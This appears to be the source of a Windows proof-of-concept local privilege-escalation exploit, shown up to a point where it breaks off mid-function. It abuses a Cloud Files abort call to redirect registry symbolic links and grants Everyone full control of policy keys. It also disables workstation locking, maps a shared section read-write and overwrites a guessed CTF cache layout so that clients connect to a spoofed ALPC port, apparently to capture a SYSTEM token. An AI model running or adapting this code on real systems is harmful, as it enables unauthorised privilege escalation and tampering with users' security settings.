
#include <Windows.h>
#include <winternl.h>
#include <aclapi.h>
#include <ntstatus.h>
#include <sddl.h>
#include <conio.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

// Local compatibility constants and PoC defaults.
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef STATUS_UNSUCCESSFUL
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
#endif

#ifndef STATUS_BUFFER_TOO_SMALL
#define STATUS_BUFFER_TOO_SMALL ((NTSTATUS)0xC0000023L)
#endif

#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#endif

#ifndef STATUS_TIMEOUT
#define STATUS_TIMEOUT ((NTSTATUS)0x00000102L)
#endif

#ifndef SECTION_QUERY
#define SECTION_QUERY 0x0001
#endif

#ifndef SECTION_MAP_WRITE
#define SECTION_MAP_WRITE 0x0002
#endif

#ifndef SECTION_MAP_READ
#define SECTION_MAP_READ 0x0004
#endif

#ifndef LPC_CONNECTION_REQUEST
#define LPC_CONNECTION_REQUEST 2
#endif

#ifndef ALPC_PORT_ALLOW_IMPERSONATION
#define ALPC_PORT_ALLOW_IMPERSONATION 0x20000
#endif

#ifndef GP_OPEN_TIMEOUT_MS
#define GP_OPEN_TIMEOUT_MS 30000
#endif

#ifndef GP_OPEN_POLL_MS
#define GP_OPEN_POLL_MS 20
#endif

#ifndef GP_OPEN_STATUS_LOG_MS
#define GP_OPEN_STATUS_LOG_MS 1000
#endif

#ifndef GP_DESKTOP_TIMEOUT_MS
#define GP_DESKTOP_TIMEOUT_MS 30000
#endif

#ifndef GP_ENABLE_SECTION_DUMP
#define GP_ENABLE_SECTION_DUMP 0
#endif

#ifndef GP_VERBOSE_TRACE
#define GP_VERBOSE_TRACE 0
#endif

#define GP_OBJECT_BASIC_INFORMATION_CLASS 0
#define GP_OBJECT_NAME_INFORMATION_CLASS 1
#define GP_OBJECT_TYPE_INFORMATION_CLASS 2
#define GP_VIEW_SHARE 1

// Native API declarations resolved at runtime.
typedef NTSTATUS(WINAPI* PFN_NtCreateSymbolicLinkObject)(
    OUT PHANDLE pHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN PUNICODE_STRING DestinationName);

typedef NTSTATUS(WINAPI* PFN_NtOpenSection)(
    _Out_ PHANDLE SectionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

typedef NTSTATUS(WINAPI* PFN_NtDeleteKey)(HANDLE hkey);

typedef NTSTATUS(WINAPI* PFN_NtQueryObject)(
    HANDLE Handle,
    ULONG ObjectInformationClass,
    PVOID ObjectInformation,
    ULONG ObjectInformationLength,
    PULONG ReturnLength);

typedef NTSTATUS(WINAPI* PFN_NtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    ULONG InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect);

typedef NTSTATUS(WINAPI* PFN_NtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress);

typedef DWORD(WINAPI* PFN_CfAbortOperation)(DWORD pid, void* unknown, DWORD flags);

typedef struct _GP_OBJECT_BASIC_INFORMATION {
    ULONG Attributes;
    ACCESS_MASK GrantedAccess;
    ULONG HandleCount;
    ULONG PointerCount;
    ULONG Reserved[10];
} GP_OBJECT_BASIC_INFORMATION, *PGP_OBJECT_BASIC_INFORMATION;

typedef short CSHORT;

typedef struct _ALPC_PORT_ATTRIBUTES {
    ULONG Flags;
    SECURITY_QUALITY_OF_SERVICE SecurityQos;
    SIZE_T MaxMessageLength;
    SIZE_T MemoryBandwidth;
    SIZE_T MaxPoolUsage;
    SIZE_T MaxSectionSize;
    SIZE_T MaxViewSize;
    SIZE_T MaxTotalViewSize;
    ULONG DupObjectTypes;
} ALPC_PORT_ATTRIBUTES, *PALPC_PORT_ATTRIBUTES;

typedef struct _PORT_MESSAGE {
    union {
        struct {
            CSHORT DataLength;
            CSHORT TotalLength;
        } s1;
        ULONG Length;
    } u1;
    union {
        struct {
            CSHORT Type;
            CSHORT DataInfoOffset;
        } s2;
        ULONG Number;
    } u2;
    CLIENT_ID ClientId;
    ULONG MessageId;
    union {
        SIZE_T ClientViewSize;
        ULONG CallbackId;
    };
} PORT_MESSAGE, *PPORT_MESSAGE;

typedef struct _ALPC_MESSAGE {
    PORT_MESSAGE PortHeader;
    BYTE PortMessage[0x1000];
} ALPC_MESSAGE, *PALPC_MESSAGE;

typedef NTSTATUS(WINAPI* PFN_NtAlpcCreatePort)(PHANDLE, POBJECT_ATTRIBUTES, PALPC_PORT_ATTRIBUTES);
typedef NTSTATUS(WINAPI* PFN_NtAlpcSendWaitReceivePort)(HANDLE, ULONG, PPORT_MESSAGE, PVOID, PPORT_MESSAGE, PSIZE_T, PVOID, PLARGE_INTEGER);
typedef NTSTATUS(WINAPI* PFN_NtAlpcAcceptConnectPort)(PHANDLE, HANDLE, ULONG, POBJECT_ATTRIBUTES, PALPC_PORT_ATTRIBUTES, PVOID, PPORT_MESSAGE, PVOID, BOOLEAN);
typedef NTSTATUS(WINAPI* PFN_NtAlpcImpersonateClientOfPort)(HANDLE, PPORT_MESSAGE, PVOID);

enum class GpMapMode {
    None,
    ReadOnly,
    ReadWrite
};

struct GpSectionView {
    PVOID base;
    SIZE_T size;
    bool writable;
    NTSTATUS status;
    GpMapMode mode;
};

struct GpDesktopTimingEvidence {
    bool observed;
    bool timedOut;
    DWORD elapsedMs;
    DWORD lastError;
    DWORD polls;
};

enum class GpStatus {
    Ok,
    InvalidInput,
    LinkFailed,
    TriggerFailed,
    SectionTimeout,
    AccessDenied,
    MapFailed,
    RegistryFailed,
    TimingMiss,
    MutationFailed
};

struct GpRegistryEvidence {
    bool attempted;
    bool succeeded;
    bool cloudFilesDaclSet;
    bool linkValueSet;
    bool policiesDaclSet;
    bool disableLockSet;
    DWORD win32Error;
};

struct GpAlpcMutationEvidence {
    bool attempted;
    bool verified;
    ULONG oldVersion;
    ULONG oldFlags;
    ULONG newVersion;
    ULONG newFlags;
};

struct GpRunEvidence {
    bool apisResolved;
    bool namesBuilt;
    bool linkCreated;
    bool triggerStarted;
    bool lockAttempted;
    bool lockSucceeded;
    DWORD sessionId;
    DWORD triggerWin32Error;
    DWORD lockWin32Error;
    NTSTATUS linkStatus;
    NTSTATUS sectionOpenStatus;
    DWORD sectionOpenElapsedMs;
    HANDLE linkHandle;
    HANDLE sectionHandle;
    ACCESS_MASK grantedAccess;
    DWORD sectionFingerprint;
    SIZE_T fingerprintBytes;
    GpSectionView view;
    GpRegistryEvidence registry;
    GpDesktopTimingEvidence desktopTiming;
    GpAlpcMutationEvidence alpc;
    HANDLE capturedSystemToken;
};

struct GpBlockedSinkResult {
    bool implemented;
    const wchar_t* reason;
    GpStatus preconditionStatus;
};

// Runtime API pointers and non-operational sink request markers.
static PFN_NtAlpcCreatePort _NtAlpcCreatePort = NULL;
static PFN_NtAlpcSendWaitReceivePort _NtAlpcSendWaitReceivePort = NULL;
static PFN_NtAlpcAcceptConnectPort _NtAlpcAcceptConnectPort = NULL;
static PFN_NtAlpcImpersonateClientOfPort _NtAlpcImpersonateClientOfPort = NULL;
static PFN_NtCreateSymbolicLinkObject _NtCreateSymbolicLinkObject = NULL;
static PFN_NtOpenSection _NtOpenSection = NULL;
static PFN_NtDeleteKey _NtDeleteKey = NULL;
static PFN_NtQueryObject _NtQueryObject = NULL;
static PFN_NtMapViewOfSection _NtMapViewOfSection = NULL;
static PFN_NtUnmapViewOfSection _NtUnmapViewOfSection = NULL;
static PFN_CfAbortOperation CfAbortOperation = NULL;

static const wchar_t GP_ALPC_PORT_NAME[] = L"\\RPC Control\\GreenPlasmaSpoofedPort";
static const wchar_t GP_BLOCKED_DLL_REQUEST[] = L"<blocked-dll-load-request>";

// Hypothesis layout for path-like state mutation. This is not a verified CTF schema.
#pragma pack(push, 1)
typedef struct _CTF_CACHE_LAYOUT_HYPOTHESIS {
    ULONG Version;
    ULONG Flags;
    ULONG OffsetToData;
    wchar_t AlpcServerPort[MAX_PATH];
} CTF_CACHE_LAYOUT_HYPOTHESIS, *PCTF_CACHE_LAYOUT_HYPOTHESIS;
#pragma pack(pop)

// Output helpers. Default output is concise; verbose trace keeps timestamps and snapshots.
static void PrintTimestamp(const wchar_t* phase)
{
#if GP_VERBOSE_TRACE
    SYSTEMTIME st;
    GetLocalTime(&st);
    wprintf(L"[%04u-%02u-%02u %02u:%02u:%02u.%03u] [%ls] ",
        st.wYear,
        st.wMonth,
        st.wDay,
        st.wHour,
        st.wMinute,
        st.wSecond,
        st.wMilliseconds,
        phase);
#else
    UNREFERENCED_PARAMETER(phase);
#endif
}

static void TraceLine(const wchar_t* phase, const wchar_t* message)
{
#if GP_VERBOSE_TRACE
    PrintTimestamp(phase);
    wprintf(L"%ls\n", message);
#else
    UNREFERENCED_PARAMETER(phase);
    UNREFERENCED_PARAMETER(message);
#endif
}

static void TraceWin32(const wchar_t* phase, const wchar_t* label, DWORD code)
{
#if GP_VERBOSE_TRACE
    PrintTimestamp(phase);
    wprintf(L"%ls: %lu (0x%08lx)\n", label, code, code);
#else
    UNREFERENCED_PARAMETER(phase);
    UNREFERENCED_PARAMETER(label);
    if (code != ERROR_SUCCESS) {
        wprintf(L"W32=0x%08lx\n", code);
    }
#endif
}

static void TraceNtStatus(const wchar_t* phase, const wchar_t* label, NTSTATUS status)
{
#if GP_VERBOSE_TRACE
    PrintTimestamp(phase);
    wprintf(L"%ls: 0x%08lx\n", label, (DWORD)status);
#else
    UNREFERENCED_PARAMETER(phase);
    UNREFERENCED_PARAMETER(label);
    if (!NT_SUCCESS(status)) {
        wprintf(L"NT=0x%08lx\n", (DWORD)status);
    }
#endif
}

static const wchar_t* GpStatusName(GpStatus status)
{
    switch (status) {
    case GpStatus::Ok:
        return L"ok";
    case GpStatus::InvalidInput:
        return L"invalid-input";
    case GpStatus::LinkFailed:
        return L"link-failed";
    case GpStatus::TriggerFailed:
        return L"trigger-failed";
    case GpStatus::SectionTimeout:
        return L"section-timeout";
    case GpStatus::AccessDenied:
        return L"access-denied";
    case GpStatus::MapFailed:
        return L"map-failed";
    case GpStatus::RegistryFailed:
        return L"registry-failed";
    case GpStatus::TimingMiss:
        return L"timing-miss";
    case GpStatus::MutationFailed:
        return L"mutation-failed";
    default:
        return L"unknown";
    }
}

static const wchar_t* GpMapModeName(GpMapMode mode)
{
    switch (mode) {
    case GpMapMode::ReadWrite:
        return L"rw";
    case GpMapMode::ReadOnly:
        return L"ro";
    case GpMapMode::None:
    default:
        return L"none";
    }
}

// API resolution and Cloud Files trigger wrapper.
static bool ResolveNativeApis()
{
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) {
        TraceWin32(L"P0", L"api", GetLastError());
        return false;
    }

    _NtCreateSymbolicLinkObject = (PFN_NtCreateSymbolicLinkObject)GetProcAddress(ntdll, "NtCreateSymbolicLinkObject");
    _NtOpenSection = (PFN_NtOpenSection)GetProcAddress(ntdll, "NtOpenSection");
    _NtDeleteKey = (PFN_NtDeleteKey)GetProcAddress(ntdll, "NtDeleteKey");
    _NtQueryObject = (PFN_NtQueryObject)GetProcAddress(ntdll, "NtQueryObject");
    _NtMapViewOfSection = (PFN_NtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
    _NtUnmapViewOfSection = (PFN_NtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
    _NtAlpcCreatePort = (PFN_NtAlpcCreatePort)GetProcAddress(ntdll, "NtAlpcCreatePort");
    _NtAlpcSendWaitReceivePort = (PFN_NtAlpcSendWaitReceivePort)GetProcAddress(ntdll, "NtAlpcSendWaitReceivePort");
    _NtAlpcAcceptConnectPort = (PFN_NtAlpcAcceptConnectPort)GetProcAddress(ntdll, "NtAlpcAcceptConnectPort");
    _NtAlpcImpersonateClientOfPort = (PFN_NtAlpcImpersonateClientOfPort)GetProcAddress(ntdll, "NtAlpcImpersonateClientOfPort");

    HMODULE cldapi = LoadLibraryW(L"cldapi.dll");
    if (cldapi) {
        CfAbortOperation = (PFN_CfAbortOperation)GetProcAddress(cldapi, "CfAbortOperation");
    }

    if (!_NtCreateSymbolicLinkObject ||
        !_NtOpenSection ||
        !_NtDeleteKey ||
        !_NtQueryObject ||
        !_NtMapViewOfSection ||
        !_NtUnmapViewOfSection ||
        !_NtAlpcCreatePort || 
        !_NtAlpcSendWaitReceivePort || 
        !_NtAlpcAcceptConnectPort || 
        !_NtAlpcImpersonateClientOfPort) {
        TraceLine(L"P0", L"api");
        return false;
    }

    return true;
}

static DWORD CallCfAbortOperation(const wchar_t* phase)
{
    if (!CfAbortOperation) {
        TraceLine(phase, L"cf");
        return ERROR_PROC_NOT_FOUND;
    }

    DWORD res = CfAbortOperation(GetCurrentProcessId(), NULL, 0x2);
    TraceWin32(phase, L"cf", res);
    return res;
}

// Optional object and registry inspection helpers.
static void PrintUnicodeInfo(const wchar_t* label, PUNICODE_STRING value)
{
#if GP_VERBOSE_TRACE
    PrintTimestamp(L"SNAPSHOT");
    if (!value || !value->Buffer || !value->Length) {
        wprintf(L"%ls=<empty>\n", label);
        return;
    }

    wprintf(L"%ls=%.*ls\n", label, value->Length / sizeof(wchar_t), value->Buffer);
#else
    UNREFERENCED_PARAMETER(label);
    UNREFERENCED_PARAMETER(value);
#endif
}

static void QueryObjectUnicode(HANDLE handle, ULONG infoClass, const wchar_t* label)
{
#if GP_VERBOSE_TRACE
    ULONG length = 0x2000;
    ULONG returned = 0;
    PBYTE buffer = (PBYTE)malloc(length);
    if (!buffer) {
        return;
    }

    NTSTATUS status = _NtQueryObject(handle, infoClass, buffer, length, &returned);
    if ((status == STATUS_INFO_LENGTH_MISMATCH || status == STATUS_BUFFER_TOO_SMALL) && returned > length) {
        free(buffer);
        length = returned + sizeof(UNICODE_STRING);
        buffer = (PBYTE)malloc(length);
        if (!buffer) {
            return;
        }
        status = _NtQueryObject(handle, infoClass, buffer, length, &returned);
    }

    if (NT_SUCCESS(status)) {
        PrintUnicodeInfo(label, (PUNICODE_STRING)buffer);
    }

    free(buffer);
#else
    UNREFERENCED_PARAMETER(handle);
    UNREFERENCED_PARAMETER(infoClass);
    UNREFERENCED_PARAMETER(label);
#endif
}

static bool QueryBasic(HANDLE handle, GP_OBJECT_BASIC_INFORMATION* basic)
{
    ULONG returned = 0;
    NTSTATUS status = _NtQueryObject(
        handle,
        GP_OBJECT_BASIC_INFORMATION_CLASS,
        basic,
        sizeof(*basic),
        &returned);

    if (!NT_SUCCESS(status)) {
        TraceNtStatus(L"SNAPSHOT", L"basic", status);
        return false;
    }

    return true;
}

static bool CaptureGrantedAccess(HANDLE handle, ACCESS_MASK* access)
{
    GP_OBJECT_BASIC_INFORMATION basic = { 0 };

    if (!access) {
        return false;
    }

    *access = 0;
    if (!QueryBasic(handle, &basic)) {
        return false;
    }

    *access = basic.GrantedAccess;
    return true;
}

static void PrintAccessEvidence(ACCESS_MASK access)
{
    wprintf(
        L"access=0x%08lx query=%u read=%u write=%u dac=%u owner=%u\n",
        access,
        (access & SECTION_QUERY) ? 1 : 0,
        (access & SECTION_MAP_READ) ? 1 : 0,
        (access & SECTION_MAP_WRITE) ? 1 : 0,
        (access & WRITE_DAC) ? 1 : 0,
        (access & WRITE_OWNER) ? 1 : 0);
}

static void LogKernelObjectSecurity(HANDLE handle)
{
#if GP_VERBOSE_TRACE
    PSECURITY_DESCRIPTOR sd = NULL;
    PSID owner = NULL;
    PSID group = NULL;
    PACL dacl = NULL;

    DWORD res = GetSecurityInfo(
        handle,
        SE_KERNEL_OBJECT,
        OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION,
        &owner,
        &group,
        &dacl,
        NULL,
        &sd);

    if (res != ERROR_SUCCESS) {
        TraceWin32(L"SECURITY", L"GetSecurityInfo", res);
        return;
    }

    LPWSTR sddl = NULL;
    if (ConvertSecurityDescriptorToStringSecurityDescriptorW(
        sd,
        SDDL_REVISION_1,
        OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION,
        &sddl,
        NULL)) {
        PrintTimestamp(L"SECURITY");
        wprintf(L"sddl=%ls\n", sddl);
        LocalFree(sddl);
    }

    if (sd) {
        LocalFree(sd);
    }
#else
    UNREFERENCED_PARAMETER(handle);
#endif
}

static void LogHandleSnapshot(const wchar_t* phase, const wchar_t* label, HANDLE handle)
{
#if GP_VERBOSE_TRACE
    GP_OBJECT_BASIC_INFORMATION basic = { 0 };

    if (!handle || handle == INVALID_HANDLE_VALUE) {
        return;
    }

    if (QueryBasic(handle, &basic)) {
        PrintAccessEvidence(basic.GrantedAccess);
        PrintTimestamp(phase);
        wprintf(L"%ls handle=0x%p handles=%lu refs=%lu attrs=0x%08lx\n",
            label,
            handle,
            basic.HandleCount,
            basic.PointerCount,
            basic.Attributes);
    }

    QueryObjectUnicode(handle, GP_OBJECT_TYPE_INFORMATION_CLASS, L"type");
    QueryObjectUnicode(handle, GP_OBJECT_NAME_INFORMATION_CLASS, L"name");
    LogKernelObjectSecurity(handle);
#else
    UNREFERENCED_PARAMETER(phase);
    UNREFERENCED_PARAMETER(label);
    UNREFERENCED_PARAMETER(handle);
#endif
}

static void LogRegistryState(const wchar_t* phase)
{
#if GP_VERBOSE_TRACE
    HKEY hk = NULL;
    wchar_t data[1024] = { 0 };
    DWORD type = 0;
    DWORD bytes = sizeof(data);
    DWORD res = RegOpenKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\Policies\\Microsoft\\CloudFiles\\BlockedApps",
        REG_OPTION_OPEN_LINK,
        KEY_QUERY_VALUE,
        &hk);

    if (res == ERROR_SUCCESS) {
        res = RegQueryValueExW(hk, L"SymbolicLinkValue", NULL, &type, (LPBYTE)data, &bytes);
        PrintTimestamp(phase);
        if (res == ERROR_SUCCESS) {
            wprintf(L"reglink type=%lu target=%ls\n", type, data);
        }
        else {
            wprintf(L"reglink query=%lu\n", res);
        }
        RegCloseKey(hk);
    }

    DWORD value = 0;
    bytes = sizeof(value);
    res = RegOpenKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0,
        KEY_QUERY_VALUE,
        &hk);
    if (res == ERROR_SUCCESS) {
        res = RegQueryValueExW(hk, L"DisableLockWorkstation", NULL, &type, (LPBYTE)&value, &bytes);
        PrintTimestamp(phase);
        if (res == ERROR_SUCCESS) {
            wprintf(L"policy type=%lu value=%lu\n", type, value);
        }
        else {
            wprintf(L"policy query=%lu\n", res);
        }
        RegCloseKey(hk);
    }
#else
    UNREFERENCED_PARAMETER(phase);
#endif
}

// Section acquisition and registry transition helpers.
static bool OpenSectionWithTimeout(
    POBJECT_ATTRIBUTES objattr,
    HANDLE* sectionHandle,
    NTSTATUS* finalStatus,
    DWORD* elapsedMs)
{
    ULONGLONG start = GetTickCount64();
    ULONGLONG lastLog = start;
    NTSTATUS lastStatus = STATUS_UNSUCCESSFUL;

    *sectionHandle = NULL;
    while (true) {
        HANDLE candidate = NULL;
        NTSTATUS status = _NtOpenSection(&candidate, MAXIMUM_ALLOWED, objattr);
        if (NT_SUCCESS(status) && candidate) {
            *sectionHandle = candidate;
            if (finalStatus) {
                *finalStatus = status;
            }
            if (elapsedMs) {
                *elapsedMs = (DWORD)(GetTickCount64() - start);
            }
            return true;
        }

        lastStatus = status;
        ULONGLONG now = GetTickCount64();
        if (now - lastLog >= GP_OPEN_STATUS_LOG_MS) {
#if GP_VERBOSE_TRACE
            TraceNtStatus(L"P3", L"open", lastStatus);
#endif
            lastLog = now;
        }

        if (now - start >= GP_OPEN_TIMEOUT_MS) {
            if (finalStatus) {
                *finalStatus = lastStatus;
            }
            if (elapsedMs) {
                *elapsedMs = (DWORD)(now - start);
            }
            TraceNtStatus(L"P3", L"open", lastStatus);
            return false;
        }

        Sleep(GP_OPEN_POLL_MS);
    }
}

static void DeleteRegistryLinkKey(HKEY hk)
{
    if (hk && _NtDeleteKey) {
        _NtDeleteKey(hk);
    }
}

static bool SetPolicyVal(GpRegistryEvidence* registry)
{
    bool ret = true;
    DWORD val = 1;
    DWORD dwRes = ERROR_SUCCESS;
    HKEY hk = NULL;
    DWORD res = ERROR_SUCCESS;
    DWORD failure = ERROR_SUCCESS;
    PACL pACL = NULL;
    EXPLICIT_ACCESSW ea;
    HANDLE htoken = NULL;
    DWORD dwSize = 0;
    wchar_t* stringSid = NULL;
    wchar_t linktarget[MAX_PATH] = { 0 };
    PTOKEN_USER pTokenUser = NULL;

    if (registry) {
        ZeroMemory(registry, sizeof(*registry));
        registry->attempted = true;
    }

    CallCfAbortOperation(L"P4");

    ZeroMemory(&ea, sizeof(ea));
    ea.grfAccessPermissions = GENERIC_ALL;
    ea.grfAccessMode = SET_ACCESS;
    ea.grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea.Trustee.ptstrName = (LPWSTR)L"Everyone";

    dwRes = SetEntriesInAclW(1, &ea, NULL, &pACL);
    if (ERROR_SUCCESS != dwRes) {
        failure = dwRes;
        TraceWin32(L"P4", L"acl", dwRes);
        goto cleanup;
    }

    res = TreeSetNamedSecurityInfoW(
        (LPWSTR)L"CURRENT_USER\\Software\\Policies\\Microsoft\\CloudFiles",
        SE_REGISTRY_KEY,
        DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
        NULL,
        NULL,
        pACL,
        NULL,
        TREE_SEC_INFO_RESET_KEEP_EXPLICIT,
        NULL,
        ProgressInvokeNever,
        NULL);
    if (res) {
        failure = res;
        TraceWin32(L"P4", L"acl", res);
        goto cleanup;
    }
    if (registry) {
        registry->cloudFilesDaclSet = true;
    }

    res = RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\CloudFiles\\BlockedApps");
    if (res && res != ERROR_FILE_NOT_FOUND) {
        failure = res;
        TraceWin32(L"P4", L"reg", res);
        goto cleanup;
    }

    res = RegCreateKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\Policies\\Microsoft\\CloudFiles\\BlockedApps",
        0,
        NULL,
        REG_OPTION_CREATE_LINK | REG_OPTION_VOLATILE,
        KEY_ALL_ACCESS,
        NULL,
        &hk,
        NULL);
    if (res) {
        failure = res;
        TraceWin32(L"P4", L"reg", res);
        goto cleanup;
    }

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htoken)) {
        failure = GetLastError();
        TraceWin32(L"P4", L"tok", GetLastError());
        DeleteRegistryLinkKey(hk);
        goto cleanup;
    }

    GetTokenInformation(htoken, TokenUser, NULL, 0, &dwSize);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        failure = GetLastError();
        TraceWin32(L"P4", L"tok", GetLastError());
        DeleteRegistryLinkKey(hk);
        goto cleanup;
    }

    pTokenUser = (PTOKEN_USER)malloc(dwSize);
    if (!pTokenUser) {
        failure = ERROR_OUTOFMEMORY;
        DeleteRegistryLinkKey(hk);
        goto cleanup;
    }

    if (!GetTokenInformation(htoken, TokenUser, pTokenUser, dwSize, &dwSize)) {
        failure = GetLastError();
        TraceWin32(L"P4", L"tok", GetLastError());
        DeleteRegistryLinkKey(hk);
        goto cleanup;
    }
    CloseHandle(htoken);
    htoken = NULL;

    if (!ConvertSidToStringSidW(pTokenUser->User.Sid, &stringSid)) {
        failure = GetLastError();
        TraceWin32(L"P4", L"sid", GetLastError());
        DeleteRegistryLinkKey(hk);
        goto cleanup;
    }

    swprintf_s(
        linktarget,
        L"\\REGISTRY\\USER\\%ls\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        stringSid);

    res = RegSetValueExW(
        hk,
        L"SymbolicLinkValue",
        0,
        REG_LINK,
        (BYTE*)linktarget,
        (DWORD)((wcslen(linktarget) + 1) * sizeof(wchar_t)));
    if (res) {
        failure = res;
        TraceWin32(L"P4", L"reg", res);
        DeleteRegistryLinkKey(hk);
        goto cleanup;
    }
    if (registry) {
        registry->linkValueSet = true;
    }

    CallCfAbortOperation(L"P4");

    res = TreeSetNamedSecurityInfoW(
        (LPWSTR)L"CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        SE_REGISTRY_KEY,
        DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
        NULL,
        NULL,
        pACL,
        NULL,
        TREE_SEC_INFO_RESET_KEEP_EXPLICIT,
        NULL,
        ProgressInvokeNever,
        NULL);
    if (res) {
        failure = res;
        TraceWin32(L"P4", L"acl", res);
        goto cleanup;
    }
    if (registry) {
        registry->policiesDaclSet = true;
    }

    if (hk) {
        DeleteRegistryLinkKey(hk);
        RegCloseKey(hk);
        hk = NULL;
    }

    res = RegOpenKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0,
        KEY_SET_VALUE,
        &hk);
    if (res) {
        failure = res;
        TraceWin32(L"P4", L"reg", res);
        goto cleanup;
    }

    res = RegSetValueExW(hk, L"DisableLockWorkstation", 0, REG_DWORD, (BYTE*)&val, sizeof(DWORD));
    if (res) {
        failure = res;
        TraceWin32(L"P4", L"reg", res);
        goto cleanup;
    }
    if (registry) {
        registry->disableLockSet = true;
    }

exit:
    if (pACL) {
        LocalFree(pACL);
    }
    if (stringSid) {
        LocalFree(stringSid);
    }
    if (pTokenUser) {
        free(pTokenUser);
    }
    if (htoken) {
        CloseHandle(htoken);
    }
    if (hk) {
        RegCloseKey(hk);
    }
    if (registry) {
        registry->succeeded = ret;
        registry->win32Error = ret ? ERROR_SUCCESS : (failure ? failure : ERROR_GEN_FAILURE);
    }
    LogRegistryState(L"P4");
    wprintf(L"registry=%ls\n", ret ? L"ok" : L"fail");
    return ret;

cleanup:
    ret = false;
    goto exit;
}

// Section mapping, compact fingerprinting, and optional prefix dump.
static GpSectionView MapSectionView(HANDLE section)
{
    GpSectionView view = { 0 };
    LARGE_INTEGER offset = { 0 };
    SIZE_T viewSize = 0;
    PVOID base = NULL;

    NTSTATUS status = _NtMapViewOfSection(
        section,
        GetCurrentProcess(),
        &base,
        0,
        0,
        &offset,
        &viewSize,
        GP_VIEW_SHARE,
        0,
        PAGE_READWRITE);

    if (NT_SUCCESS(status)) {
        view.base = base;
        view.size = viewSize;
        view.writable = true;
        view.mode = GpMapMode::ReadWrite;
        view.status = status;
        wprintf(L"map=rw size=%zu\n", viewSize);
        return view;
    }

    base = NULL;
    viewSize = 0;
    status = _NtMapViewOfSection(
        section,
        GetCurrentProcess(),
        &base,
        0,
        0,
        &offset,
        &viewSize,
        GP_VIEW_SHARE,
        0,
        PAGE_READONLY);

    view.status = status;
    if (NT_SUCCESS(status)) {
        view.base = base;
        view.size = viewSize;
        view.writable = false;
        view.mode = GpMapMode::ReadOnly;
        wprintf(L"map=ro size=%zu\n", viewSize);
    }
    else {
        view.mode = GpMapMode::None;
        wprintf(L"map=fail NT=0x%08lx\n", (DWORD)status);
    }

    return view;
}

static void DumpSectionPrefix(const GpSectionView* view)
{
#if GP_ENABLE_SECTION_DUMP
    if (!view || !view->base || !view->size) {
        return;
    }

    SIZE_T count = view->size < 256 ? view->size : 256;
    BYTE* bytes = (BYTE*)view->base;
    for (SIZE_T offset = 0; offset < count; offset += 16) {
        SIZE_T line = (count - offset) < 16 ? (count - offset) : 16;
        wprintf(L"dump[%04zx]=", offset);
        for (SIZE_T i = 0; i < line; ++i) {
            wprintf(L"%02x", bytes[offset + i]);
        }
        wprintf(L"\n");
    }
#else
    UNREFERENCED_PARAMETER(view);
#endif
}

static void CaptureSectionFingerprint(GpRunEvidence* run)
{
    const DWORD fnvOffset = 2166136261u;
    const DWORD fnvPrime = 16777619u;
    DWORD hash = fnvOffset;

    if (!run || !run->view.base || !run->view.size) {
        return;
    }

    SIZE_T count = run->view.size < 256 ? run->view.size : 256;
    BYTE* bytes = (BYTE*)run->view.base;
    for (SIZE_T i = 0; i < count; ++i) {
        hash ^= bytes[i];
        hash *= fnvPrime;
    }

    run->sectionFingerprint = hash;
    run->fingerprintBytes = count;
    wprintf(
        L"fingerprint=0x%08lx bytes=%zu mode=%ls\n",
        hash,
        count,
        GpMapModeName(run->view.mode));
}

// ALPC primary-path hypothesis. This records only a controlled path-like mutation.
static bool ApplyAlpcPathMutation(GpRunEvidence* run, const wchar_t* portName)
{
    if (!run) {
        return false;
    }

    run->alpc.attempted = true;
    run->alpc.verified = false;

    if (!run->desktopTiming.observed) {
        wprintf(L"alpc=skip timing\n");
        return false;
    }

    if (!portName || !portName[0] || wcslen(portName) >= MAX_PATH) {
        wprintf(L"alpc=skip input\n");
        return false;
    }

    if (!run->view.base || !run->view.writable || run->view.size < sizeof(CTF_CACHE_LAYOUT_HYPOTHESIS)) {
        wprintf(L"alpc=skip map\n");
        return false;
    }

    PCTF_CACHE_LAYOUT_HYPOTHESIS layout = (PCTF_CACHE_LAYOUT_HYPOTHESIS)run->view.base;
    run->alpc.oldVersion = layout->Version;
    run->alpc.oldFlags = layout->Flags;

    layout->Version = 1;
    layout->Flags |= 0x00000001;
